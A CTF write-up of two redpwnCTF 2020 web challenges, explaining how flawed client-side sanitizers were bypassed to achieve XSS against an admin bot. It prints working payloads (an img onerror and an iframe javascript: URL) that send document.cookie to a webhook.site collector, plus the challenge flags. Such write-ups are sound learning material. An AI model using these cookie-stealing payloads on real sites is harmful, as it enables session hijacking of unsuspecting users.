---
title: "redpwnCTF 2020 Web"
date: 2020-06-29T14:16:00+00:00
# weight: 1
# aliases: ["/first"]
tags: ["web", "writeup", "redpwnctf"]
author: "Me"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: true
draft: false
hidemeta: false
comments: false
description: "Writeups on web exploitation challenges for redpwnCTF 2020"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
---

<img src="/img/web.png">

---

## static-pastebin
**Category:** Web

**Points:** 373

**Description:**
> I wanted to make a website to store bits of text, but I don't have any experience
with web development. However, I realized that I don't need any! If you experience
any issues, make a paste and send it `here` (https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin)
>
> **Site:** `static-pastebin.2020.redpwnc.tf`
>
> **Note:** The site is entirely static. Dirbuster will not be useful in solving it.
>
> **Author:** BrownieInMotion

### Writeup
The first thing I do is check out both websites. The first website after "here"
was a bot URL submission page. The other website is a big text box, so yes, a
pastebin.

<img src="bot_submission.PNG" alt="Bot Submission">
<img src="pastebin.PNG" alt="Static Webpage">

Right away I realized this had to be a reflected XSS (Cross-Site Scripting) attack. There
are two types of XSS attacks: **stored** and **reflected**. A **stored** XSS attack
usually happens when a malicious script from an attacker is injected into a website
which is vulnerable to it. One application of this could be a reverse PHP shell,
allowing the attacker access to the webserver. Now, a **reflected** XSS attack
is when a malicious script is injected into a website, but takes advantage of people
visiting this website. Basically, an attacker is able to change a webpage in a way
to mess with another user/website visitor.

In this case, we have a **reflected** XSS attack because we have a bot page coming
to visit our website and it probably has some important information in it's **cookies**.
Anyways, let's see what happens if we paste something and enter it:

<img src="first_try.PNG" alt="First Attempt">

Looks like the link it generated for us is in base64, but makes it so that we can
really put anything and it will condense down to a website the bot can go to. I
opened up the source code to see what we are working with. They have a public JS
file shown to us:
```
(async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const content = window.location.hash.substring(1);
    display(atob(content));
})();

function display(input) {
    document.getElementById('paste').innerHTML = clean(input);
}

function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}
```

Aaaaaand some sanitation. Looks like it doesn't want us to put any tags in at all.
The sanitation method is weird though. They use a counter to determine whether any
bracket has been laid down. If two have been laid down, everything in between those
brackets will be sanitized. Unlessss we switch up the order of the tags.

**Payload:** ` ><script>< `

**Output:**
```
<div id="paste">
    &gt;<script><</script>
</div>
```

I tried a few ways to get an **alert** to pop up, but no luck. I figured out that
the only thing that is possible is to make this exploit in **one tag**. But how?


The `<img>` tag has a `src` attribute, which allows us to maybe redirect the
user to a different website. I ended up getting this to return a JS alert:
` ><img src=x onerror=alert(1);>< `.

Sweet! This is definitely a sanity check lol. Now I needed to just steal the bot's
cookie (or my own for testing). This took me about a year to find, but this
website called **Webhook** gives us a url to live on and send request to. I did some
digging and research and found the final exploit. I will have my cookie be:
` XSS = but make it reflected `.

**Exploit:**
```
><img src=x onerror=this.src='https://webhook.site/b3ead4c5-b498-4d5f-9b82-f6fa49d9639f/?'+document.cookie; this.removeAttribute('onerror');><
```

**Webhook:**

<img src="make_it_reflected.PNG" alt="Testing Payload">

Niceeeeee. Now let's give this malicious cookie-stealing link to the admin bot.

**Webhook:**

<img src="bot.PNG" alt="Bot get's pwned">

I thought this challenge was pretty cool to be honest. I learned about XSS attacks
in school, but never had to develop a payload for one. Awesome challenge.

### Flag
`flag{54n1t1z4t10n_k1nd4_h4rd}`

### Resources
[Webhook](https://webhook.site/)

---

## static-static-hosting
**Category:** Web

**Points:** 434

**Description:**
> Seeing that my last website was a success, I made a version where instead of
storing text, you can make your own custom websites! If you make something cool,
 send it to me here
>
> **Site:** ` static-static-hosting.2020.redpwnc.tf `
>
> **Note:** The site is entirely static. Dirbuster will not be useful in solving it.
>
> **Author:** BrownieInMotion

### Writeup
This challenge is very similar to the **static-pastebin**
challenge. I would even consider it a precursor to this challenge, so I will
keep this writeup short. If you want more information, check out my
[writeup for static-pastebin](https://github.com/itsecgary/CTFs/tree/master/redpwnCTF%202020/static-pastebin)

Anyways, we check the two links above and get the same bot submission webpage as
well as the same type of pastebin website. The title changed and we see that we
are pasting "HTML" instead of text. Nonetheless, it will most likely be another
**Reflected XSS** attack.

I went ahead and tested out a random word to
see what we are working with. I check the sources and we have another sanitization
function to work with:
```
function sanitize(element) {
    const attributes = element.getAttributeNames();
    for (let i = 0; i < attributes.length; i++) {
        // Let people add images and styles
        if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) {
            element.removeAttribute(attributes[i]);
        }
    }

    const children = element.children;
    for (let i = 0; i < children.length; i++) {
        if (children[i].nodeName === 'SCRIPT') {
            element.removeChild(children[i]);
            i --;
        } else {
            sanitize(children[i]);
        }
    }
}
```

Looks like we won't be able to but any "script" tags anywhere in there. We can
also see it sanitizes attributes, which limits us even more. Our goal here is probably
to steal the admin-bot's cookie again and we will need to inject some javascript
into a tag here.

After messing around for a while, I reached a point where I am able to overwrite
the location of the current session to a different website. I will be using **Webhook** again
because it worked well for me for the last challenge.

Here is my final exploit:
```
<iframe src="javascript:top.location.href='https://webhook.site/b3ead4c5-b498-4d5f-9b82-f6fa49d9639f/?'+document.cookie"></iframe>
```

I will enter a cookie: "XSS = but make it reflected (part 2)" and test it out.

<img src="attempt.PNG" alt="Attempt 1">

When we click on "Take me to my website!", it redirects right away and it is hard to copy
the address right away. For this case, I just base64 encoded it and put together the URL
and submitted it to the admin-bot.

<img src="winner.PNG" alt="We got the flag">

### Flag
`flag{wh0_n33d5_d0mpur1fy}`

### Resources
[Webhook](https://webhook.site/)

---

